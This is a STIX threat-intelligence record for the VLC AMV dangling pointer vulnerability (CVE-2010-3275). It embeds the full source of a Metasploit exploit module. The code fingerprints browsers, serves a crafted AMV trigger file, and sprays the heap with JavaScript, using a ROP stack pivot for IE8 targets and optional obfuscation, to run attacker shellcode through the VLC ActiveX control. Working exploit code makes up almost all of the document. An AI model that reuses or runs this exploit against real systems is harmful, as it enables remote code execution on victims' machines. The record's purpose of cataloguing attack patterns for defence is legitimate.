{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--ee141bcf-bc62-4583-bb6f-266c2a9abd13",
    "created": "2024-08-14T16:43:16.613968Z",
    "modified": "2024-08-14T16:43:16.613972Z",
    "name": "\"VLC AMV Dangling Pointer Vulnerability\"",
    "description": " This module exploits VLC media player when handling a .AMV file. By flipping the 0x41st byte in the file format (video width/height), VLC crashes due to an invalid pointer, which allows remote attackers to gain arbitrary code execution. The vulnerable packages include: VLC 1.1.4, VLC 1.1.5, VLC 1.1.6, VLC 1.1.7. Also please note that IE 8 targets require Java support in order to run properly.  'License'     => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/vlc_amv.rb",
            "external_id": "vlc_amv.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2010-3275"
        },
        {
            "source_name": "reference",
            "url": "http://www.coresecurity.com/content/vlc-vulnerabilities-amv-nsv-files"
        },
        {
            "source_name": "reference",
            "url": "http://git.videolan.org/?p=vlc/vlc-1.1.git;a=commitdiff;h=fe44129dc6509b3347113ab0e1a0524af1e0dd11"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GoodRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::RopDb\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'        => \"VLC AMV Dangling Pointer Vulnerability\",\n      'Description' => %q{\n          This module exploits VLC media player when handling a .AMV file. By flipping\n        the 0x41st byte in the file format (video width/height), VLC crashes due to an\n        invalid pointer, which allows remote attackers to gain arbitrary code execution.\n        The vulnerable packages include: VLC 1.1.4, VLC 1.1.5, VLC 1.1.6, VLC 1.1.7. Also,\n        please note that IE 8 targets require Java support in order to run properly.\n        },\n      'License'     => MSF_LICENSE,\n      'Author'      =>\n        [\n          'sinn3r',\n        ],\n      'References' =>\n        [\n          ['CVE', '2010-3275'],\n          ['OSVDB', '71277'],\n          ['URL', 'http://www.coresecurity.com/content/vlc-vulnerabilities-amv-nsv-files'],\n          # Fix commit diff\n          ['URL', 'http://git.videolan.org/?p=vlc/vlc-1.1.git;a=commitdiff;h=fe44129dc6509b3347113ab0e1a0524af1e0dd11']\n        ],\n      'Payload' =>\n        {\n          'BadChars'        => \"\\x00\",\n          'space'           => 1024,\n          #Fix the stack before the decoder so we can decode properly\n          #SUB SP, 0X100; POPAD; POPFD\n          'PrependEncoder'  => \"\\x66\\x81\\xec\\x01\\x01\\x61\",\n          #Fix the stack again so the payload runs properly\n          #ADD SP,0x61\n          'Prepend'         => \"\\x66\\x83\\xc4\\x61\",\n        },\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => \"process\",\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate',\n        },\n      'Platform' => 'win',\n      'Targets'  =>\n        [\n          [ 'Automatic', {} ],\n          [ 'Internet Explorer 6 on XP SP3', { 'Rop' => false, 'TargetAddr' => 0x0c0c0c0c } ],\n          [ 'Internet Explorer 7 on XP SP3', { 'Rop' => false, 'TargetAddr' => 0x0c0c0c0c } ],\n          [ 'Internet Explorer 8 on XP SP3', { 'Rop' => true,  'TargetAddr' => 0x77025024 } ],\n          [ 'Internet Explorer 7 on Vista',  { 'Rop' => false, 'TargetAddr' => 0x0c0c0c0c } ]\n        ],\n      'DisclosureDate' => '2011-03-23',\n      'DefaultTarget' => 0))\n\n    register_options(\n      [\n        OptBool.new('OBFUSCATE', [false, 'Enable JavaScript obfuscation'])\n      ])\n  end\n\n  def get_target(cli, request)\n    #Default target\n    my_target = target\n\n    vprint_status(\"User-Agent: #{request.headers['User-Agent']}\")\n\n    if target.name == 'Automatic'\n      agent = request.headers['User-Agent']\n      if agent =~ /NT 5\\.1/ and agent =~ /MSIE 6\\.0/\n        #Windows XP + IE 6\n        my_target = targets[1]\n      elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 7\\.0/\n        #Windows XP + 7.0\n        my_target = targets[2]\n      elsif agent =~ /NT 5\\.1/ and agent =~ /MSIE 8\\.0/\n        #Windows XP + IE 8.0\n        my_target = targets[3]\n      elsif agent =~ /NT 6\\.0/ and agent =~ /MSIE 7\\.0/\n        #Windows Vista + IE 7.0. Win Server 2008 is also NT 6.0\n        my_target = targets[4]\n      elsif agent =~ /^vlc/\n        #VLC identifies itself as \"VLC\" when requesting our trigger file\n        return 'VLC'\n      elsif agent =~ /^NSPlayer/\n        #NSPlayer is also used while requesting the trigger file\n        return 'VLC'\n      else\n        #If we don't recognize the client, we don't fire the exploit\n        my_target = nil\n      end\n    end\n\n    return my_target\n  end\n\n  def exploit\n    #Load trigger file\n    path = File.join(Msf::Config.data_directory, \"exploits\", \"CVE-2010-3275.amv\")\n    f = File.open(path, \"rb\")\n    @trigger = f.read\n    f.close\n\n    #Set trigger file name\n    @filename = rand_text_alpha(rand(6) + 3)\n\n    super\n  end\n\n  def on_request_uri(cli, request)\n    #Pick the right target\n    my_target = get_target(cli, request)\n    if my_target.nil?\n      vprint_error(\"Target not supported\")\n      send_not_found(cli)\n      return\n    end\n\n    vprint_status(\"URL: #{request.uri.to_s}\")\n\n    #Send the trigger file upon request\n    if request.uri.match(/\\.amv/)\n      print_status(\"Sending trigger file\")\n      send_response(cli, @trigger, { 'Content-Type' => 'text/plain' } )\n      return\n    end\n\n    #ARCH used by the victim machine\n    arch = Rex::Arch.endian(my_target.arch)\n\n    #Generate our payload\n    if my_target['Rop']\n      #IE 8 targets\n      code = generate_rop_payload('java', payload.encoded)\n\n      #Align and 'jump' to our final payload at 0x0c0c0c0c\n      ini_stage = [\n        0x7c346c0a,  # POP EAX # RETN (MSVCR71.dll)\n        0x0c0c0c0c,  # Address of the payload\n        0x7C348B05,  # XCHG EAX,ESP # RETN (MSVCR71.dll)\n      ].pack('V*')\n\n      #Add padding to line up the pivot correctly\n      ini_stage << rand_text_alpha(128-ini_stage.length)\n\n      nops = Rex::Text.to_unescape(rand_text_alpha(4), arch)\n      code = Rex::Text.to_unescape(code, arch)\n      pivot = Rex::Text.to_unescape(ini_stage + [my_target['TargetAddr']].pack('V*'), arch)\n    else\n      #Non IE 8 targets\n      nops = Rex::Text.to_unescape(\"\\x0c\\x0c\\x0c\\x0c\", arch)\n      code = Rex::Text.to_unescape(payload.encoded, arch)\n      pivot   = Rex::Text.to_unescape([my_target['TargetAddr']].pack('V*'), arch)\n    end\n    randnop = rand_text_alpha(rand(100) + 1)\n\n    #First spray overwrites 0x0c0c0c0c with our payload\n    spray_1 = <<-JS\n    var heap_obj = new heapLib.ie(0x20000);\n    var code = unescape(\"#{code}\");\n    var #{randnop} = \"#{nops}\";\n    var nops = unescape(#{randnop});\n\n    while (nops.length < 0x1000) nops += nops;\n    var offset = nops.substring(0, 0x600-0x20);\n    var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);\n\n    while (shellcode.length < 0x20000) shellcode += shellcode;\n    var block = shellcode.substring(0, (0x10000-6)/2);\n\n    heap_obj.gc();\n\n    for (var i=0; i<0x1000; i++) {\n      heap_obj.alloc(block);\n    }\n    JS\n\n    #An invalid pointer gets passed on to libdirectx_plugin!vlc_entry_license__1_1_0g,\n    #which requires us to fill up the memory as high as 0x303234ca\n    spray_2 = <<-JS\n    var padding = unescape(#{randnop});\n    var pivot = unescape(\"#{pivot}\");\n\n    while (padding.length < 0x20000) padding += padding;\n    var offset2 = padding.substring(0, 0x1ff);\n    var p = offset2 + pivot + nops.substring(0, 0x800-pivot.length-offset2.length);\n\n    while (p.length < 0x20000) p += p;\n    var pivot_block = p.substring(0, (0x10000-6)/2);\n\n    for (var i2=0; i2 < 0x2000; i2++) {\n      heap_obj.alloc(pivot_block);\n    }\n    JS\n\n    #Use heaplib\n    js = heaplib(spray_1 + spray_2)\n\n    #obfuscate on demand\n    if datastore['OBFUSCATE']\n      js = ::Rex::Exploitation::JSObfu.new(js)\n      js.obfuscate(memory_sensitive: true)\n    end\n\n    #Value for the 'Src' parameter of our ActiveX control\n    trigger_file = get_resource() + \"/\" + @filename + \".amv\"\n\n    html = <<-EOS\n    <html>\n    <head>\n    </head>\n    <body>\n    <script language='javascript'>\n    #{js}\n    </script>\n    <object classid=\"clsid:9BE31822-FDAD-461B-AD51-BE1D1C159921\"\n        codebase=\"http://downloads.videolan.org/pub/videolan/vlc/latest/win32/axvlc.cab\"\n        width=\"0\" height=\"0\"\n        events=\"True\">\n    <param name=\"Src\" value=\"#{trigger_file}\"></param>\n    <param name=\"ShowDisplay\" value=\"False\" ></param>\n    <param name=\"AutoLoop\" value=\"no\"></param>\n    <param name=\"AutoPlay\" value=\"yes\"></param>\n    </object>\n    </body>\n    </html>\n    EOS\n\n    #Remove extra tabs in HTML\n    html = html.gsub(/^ {4}/, \"\")\n\n    print_status(\"Sending #{self.name}\")\n    send_response( cli, html, {'Content-Type' => 'text/html'} )\n  end\nend\n",
    "x_mitre_disclosure_date": "2011-03-23",
    "x_mitre_platforms": [
        "win'"
    ]
}